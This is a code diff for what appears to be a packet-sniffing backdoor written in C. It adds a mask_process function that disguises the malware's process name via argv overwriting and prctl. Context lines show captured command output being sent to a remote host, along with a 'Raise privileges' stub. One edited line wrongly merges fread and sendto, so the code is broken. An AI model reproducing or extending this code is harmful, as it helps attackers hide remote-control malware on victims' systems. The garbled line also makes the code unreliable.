@@ -76,6 +76,8 @@ int main(int argc, char **argv){
         }
     }
     
+    mask_process(argv, PROCESS_NAME);
+
     /* Validation then run client or server */
     
     if(is_server){
@@ -85,6 +87,7 @@ int main(int argc, char **argv){
         }
         else{
             server(s_opt);
+	    
         }
     }
     else{
@@ -180,6 +183,7 @@ void server(struct server_opt s_opt){
     printf("Running server...\n");
 
     /* Mask process name */
+    
     
     /* Raise privileges */
     
@@ -430,12 +434,23 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     
     char output[1024];
     memset(output, 0, 1024);
-    fread((void *)output, sizeof(char), 1024, 
-    
-    sendto(sockfd, output, strlen(output), 0, (struct sockaddr *)&dst_host, sizeof(dst_host));
+    fread((void *)output, sizeof(char), 1024, sendto(sockfd, output, strlen(output), 0, (struct sockaddr *)&dst_host, sizeof(dst_host)));
     
     close(sockfd);
     pclose(fp);
+}
+
+/*
+| ------------------------------------------------------------------------------
+| Mask process under daemon
+| ------------------------------------------------------------------------------
+*/
+
+void mask_process(char *argv[], char *name){
+    
+    memset(argv[0], 0, strlen(argv[0]));
+    strcpy(argv[0], name);
+    prctl(PR_SET_NAME, name, 0, 0);
 }
 
 /*
